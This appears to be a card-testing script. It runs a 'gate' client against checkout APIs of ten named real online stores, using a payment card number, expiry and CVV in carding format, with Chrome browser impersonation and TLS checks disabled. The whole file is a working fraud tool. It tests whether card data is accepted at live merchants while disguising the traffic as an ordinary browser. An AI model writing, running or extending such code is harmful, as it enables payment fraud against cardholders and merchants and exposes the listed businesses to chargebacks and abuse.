import asyncio
import sys
sys.path.insert(0, r"c:\Users\Redmi\Downloads\pusto")
sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")
from curl_cffi.requests import AsyncSession
import gate_client as gc

candidates = [
    'forageplus.co.uk',
    'efjerky.com',
    'thatscoffee.com',
    'strictlymedicinalseeds.com',
    'abbeygifts.co.uk',
    'italiaeconomy.it',
    'oliveepitome.com',
    'simplerootssoap.com',
    'wp-rocket.me',
    'lifterlms.com'
]

async def test(dom):
    print(f"[*] Testing {dom}...")
    async with AsyncSession(impersonate='chrome120', verify=False) as s:
        try:
            res = await asyncio.wait_for(
                gc.store_api_confirm(s, f'https://{dom}', '', '4559516073479539|01|2029|277', max_price_cents=3500),
                timeout=18
            )
            status = res.get('status')
            detail = res.get('detail', '')
            print(f"    -> {dom}: {status} ({detail[:90]})")
        except asyncio.TimeoutError:
            print(f"    -> {dom}: TIMEOUT (18s)")
        except Exception as e:
            print(f"    -> {dom}: EXC {e}")

async def main():
    for c in candidates:
        await test(c)

if __name__ == '__main__':
    asyncio.run(main())
